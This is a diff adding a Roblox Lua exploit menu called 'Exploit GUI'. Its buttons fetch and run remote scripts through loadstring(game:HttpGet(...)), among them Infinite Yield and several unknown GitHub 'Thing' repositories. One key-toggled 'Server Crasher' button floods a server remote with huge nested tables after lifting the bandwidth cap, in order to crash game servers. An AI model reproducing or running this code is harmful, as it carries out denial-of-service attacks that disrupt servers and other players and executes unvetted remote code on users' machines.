@@ -1,0 +1,306 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local ExploitGUI = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local DarkerFrame = Instance.new("Frame")
+local Yielder = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local RealTimeTranslator = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local Amogus = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local Bike = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local Cursed = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local RFE = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local Lagger = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local UICorner_8 = Instance.new("UICorner")
+local TextLabel = Instance.new("TextLabel")
+local ImageLabel = Instance.new("ImageLabel")
+local UICorner_9 = Instance.new("UICorner")
+local UICorner_10 = Instance.new("UICorner")
+
+--Properties:
+
+ExploitGUI.Name = "Exploit GUI"
+ExploitGUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ExploitGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ExploitGUI.ResetOnSpawn = false
+
+Frame.Parent = ExploitGUI
+Frame.Active = true
+Frame.BackgroundColor3 = Color3.fromRGB(31, 32, 29)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.Draggable = true
+Frame.Position = UDim2.new(0.0515321009, 8, 0.568095326, -20)
+Frame.Selectable = true
+Frame.Size = UDim2.new(0, 454, 0, 265)
+
+DarkerFrame.Name = "DarkerFrame"
+DarkerFrame.Parent = Frame
+DarkerFrame.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
+DarkerFrame.Position = UDim2.new(0.0200007875, 0, 0.169811323, 0)
+DarkerFrame.Size = UDim2.new(0, 436, 0, 202)
+
+Yielder.Name = "Yielder"
+Yielder.Parent = DarkerFrame
+Yielder.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+Yielder.Position = UDim2.new(0.726275444, 0, 0.020642573, 0)
+Yielder.Size = UDim2.new(0, 113, 0, 183)
+Yielder.Font = Enum.Font.Ubuntu
+Yielder.Text = "Infinite Yield"
+Yielder.TextColor3 = Color3.fromRGB(255, 255, 255)
+Yielder.TextSize = 22.000
+Yielder.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+Yielder.TextWrapped = true
+
+UICorner.Parent = Yielder
+
+RealTimeTranslator.Name = "Real Time Translator"
+RealTimeTranslator.Parent = DarkerFrame
+RealTimeTranslator.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+RealTimeTranslator.Position = UDim2.new(0.0110992994, 0, 0.0354940593, 0)
+RealTimeTranslator.Size = UDim2.new(0, 113, 0, 45)
+RealTimeTranslator.Font = Enum.Font.Ubuntu
+RealTimeTranslator.Text = "Real Time Translator"
+RealTimeTranslator.TextColor3 = Color3.fromRGB(255, 255, 255)
+RealTimeTranslator.TextSize = 22.000
+RealTimeTranslator.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+RealTimeTranslator.TextWrapped = true
+
+UICorner_2.Parent = RealTimeTranslator
+
+Amogus.Name = "Amogus"
+Amogus.Parent = DarkerFrame
+Amogus.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+Amogus.Position = UDim2.new(0.0105873598, 0, 0.723612845, 0)
+Amogus.Size = UDim2.new(0, 114, 0, 44)
+Amogus.Font = Enum.Font.Ubuntu
+Amogus.Text = "Amogus"
+Amogus.TextColor3 = Color3.fromRGB(255, 255, 255)
+Amogus.TextSize = 22.000
+Amogus.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+Amogus.TextWrapped = true
+
+UICorner_3.Parent = Amogus
+
+Bike.Name = "Bike"
+Bike.Parent = DarkerFrame
+Bike.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+Bike.Position = UDim2.new(0.0105873598, 0, 0.386979222, 0)
+Bike.Size = UDim2.new(0, 114, 0, 44)
+Bike.Font = Enum.Font.Ubuntu
+Bike.Text = "Bike"
+Bike.TextColor3 = Color3.fromRGB(255, 255, 255)
+Bike.TextSize = 22.000
+Bike.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+Bike.TextWrapped = true
+
+UICorner_4.Parent = Bike
+
+Cursed.Name = "Cursed"
+Cursed.Parent = DarkerFrame
+Cursed.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+Cursed.Position = UDim2.new(0.368385524, 0, 0.386979222, 0)
+Cursed.Size = UDim2.new(0, 114, 0, 44)
+Cursed.Font = Enum.Font.Ubuntu
+Cursed.Text = "Cursed64"
+Cursed.TextColor3 = Color3.fromRGB(255, 255, 255)
+Cursed.TextSize = 22.000
+Cursed.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+Cursed.TextWrapped = true
+
+UICorner_5.Parent = Cursed
+
+RFE.Name = "RFE"
+RFE.Parent = DarkerFrame
+RFE.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+RFE.Position = UDim2.new(0.368897468, 0, 0.0354940593, 0)
+RFE.Size = UDim2.new(0, 113, 0, 45)
+RFE.Font = Enum.Font.Ubuntu
+RFE.Text = "RFE"
+RFE.TextColor3 = Color3.fromRGB(255, 255, 255)
+RFE.TextSize = 22.000
+RFE.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+RFE.TextWrapped = true
+
+UICorner_6.Parent = RFE
+
+Lagger.Name = "Lagger"
+Lagger.Parent = DarkerFrame
+Lagger.BackgroundColor3 = Color3.fromRGB(62, 61, 64)
+Lagger.Position = UDim2.new(0.366091937, 0, 0.708761394, 0)
+Lagger.Size = UDim2.new(0, 114, 0, 44)
+Lagger.Font = Enum.Font.Ubuntu
+Lagger.Text = "Server Fuck (P)"
+Lagger.TextColor3 = Color3.fromRGB(255, 255, 255)
+Lagger.TextSize = 22.000
+Lagger.TextStrokeColor3 = Color3.fromRGB(217, 134, 39)
+Lagger.TextWrapped = true
+
+UICorner_7.Parent = Lagger
+
+UICorner_8.Parent = DarkerFrame
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
+TextLabel.Position = UDim2.new(0, 0, -0.0579114221, 0)
+TextLabel.Size = UDim2.new(0, 454, 0, 50)
+TextLabel.Font = Enum.Font.Ubuntu
+TextLabel.Text = "Citrussy GE"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 51.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 89, 88)
+TextLabel.TextStrokeTransparency = 0.000
+TextLabel.TextWrapped = true
+
+ImageLabel.Parent = TextLabel
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.Position = UDim2.new(0.874449372, 0, 0.0800000131, 0)
+ImageLabel.Size = UDim2.new(0, 41, 0, 41)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=9999212730"
+
+UICorner_9.Parent = TextLabel
+
+UICorner_10.Parent = Frame
+
+Cursed.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Taleo222/CursingThing/main/source'))()
+end)
+
+Bike.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Taleo222/BikeThingng/main/source'))()
+end)
+
+Amogus.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Taleo222/AmogngThing/main/source'))()
+end)
+
+RFE.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Taleo222/RFEthing/main/source'))()
+end)
+
+RealTimeTranslator.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Taleo222/TranslationThing/main/source'))()
+end)
+
+Yielder.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+Lagger.MouseButton1Down:Connect(function()
+	--// fixed by ewo 6/17/2022
+
+	--//settings + variables
+	getgenv().Toggled = false
+	getgenv().KeyBind = "P"
+	getgenv().Delay = 0.7
+	local UIS = game:GetService "UserInputService"
+
+	--//main
+
+	local function Source()
+		game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+		local function getmaxvalue(val)
+			local mainvalueifonetable = 49999
+			if type(val) ~= "number" then
+				return nil
+			end
+			local calculateperfectval = (mainvalueifonetable / (val + 2))
+			return calculateperfectval
+		end
+
+		local function bomb(tableincrease, tries)
+			local maintable = {}
+			local spammedtable = {}
+
+			table.insert(spammedtable, {})
+			z = spammedtable[1]
+
+			for i = 1, tableincrease do
+				local tableins = {}
+				table.insert(z, tableins)
+				z = tableins
+			end
+
+			local calculatemax = getmaxvalue(tableincrease)
+			local maximum
+
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 10000
+			end
+
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+
+			if calculatemax then
+				maximum = calculatemax
+			else
+				maximum = 10000
+			end
+
+			for i = 1, maximum do
+				table.insert(maintable, spammedtable)
+			end
+
+			for i = 1, tries do
+				game.RobloxReplicatedStorage.UpdatePlayerBlockList:FireServer(maintable)
+			end
+		end
+
+		bomb(250, 5) --// change values if client crashes
+	end
+
+	UIS.InputBegan:Connect(
+		function(Key)
+			if Key.KeyCode == Enum.KeyCode[getgenv().KeyBind:upper()] and not UIS:GetFocusedTextBox() then
+				if getgenv().Toggled then
+					getgenv().Toggled = false
+					warn "Disabled!"
+					game.StarterGui:SetCore(
+						"SendNotification",
+						{
+							Title = "Server Crasher",
+							Text = "Disabled!",
+							Duration = 5 
+						}
+					)
+
+				elseif not getgenv().Toggled then
+					getgenv().Toggled = true
+					warn "Enabled!"
+					game.StarterGui:SetCore(
+						"SendNotification",
+						{
+							Title = "Server Crasher",
+							Text = "Enabled!",
+							Duration = 5 
+						}
+					)
+					while getgenv().Toggled do
+						Source()
+						wait(getgenv().Delay)
+					end
+				end
+			end
+		end
+	)
+end)
+
+game.StarterGui:SetCore("SendNotification", {
+	Title = "Grapefruit Juice"; -- the title (ofc)
+	Text = "Bitter - UI By GE_KI"; -- what the text says (ofc)
+	Icon = "rbxassetid://9999212730"; -- the image if u want. 
+	Duration = 5; -- how long the notification should in secounds
+	Button1 = "yessir";
+})
